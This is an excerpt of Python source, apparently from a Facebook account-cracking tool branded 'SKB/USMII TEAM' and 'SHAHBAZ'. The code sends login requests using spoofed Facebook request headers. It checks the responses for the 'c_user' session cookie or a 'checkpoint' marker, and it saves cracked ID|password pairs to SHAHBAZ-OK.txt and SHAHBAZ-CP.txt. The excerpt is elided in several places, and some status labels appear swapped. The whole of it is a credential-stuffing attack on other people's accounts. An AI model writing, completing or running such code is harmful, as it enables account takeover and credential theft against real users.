...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> SKB/USMII TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/SHAHBAZ.txt')
				linex()
...
'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryv9oN8mzFpDwUtEnn',
'x-fb-lsd': 'AVoFOkC7iXo',
...
'accept-language': 'en-US,en;q=0.9',}
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[SHAHBAZ-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/SHAHBAZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[SHAHBAZ-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/SHAHBAZ-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
'accept-language': 'en-US,en;q=0.9',}
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[SHAHBAZ-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[SHAHBAZ-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'checkpoint' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[SHAHBAZ-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[SHAHBAZ-OK] '+cid+' | '+ps+'\33[0;97m')
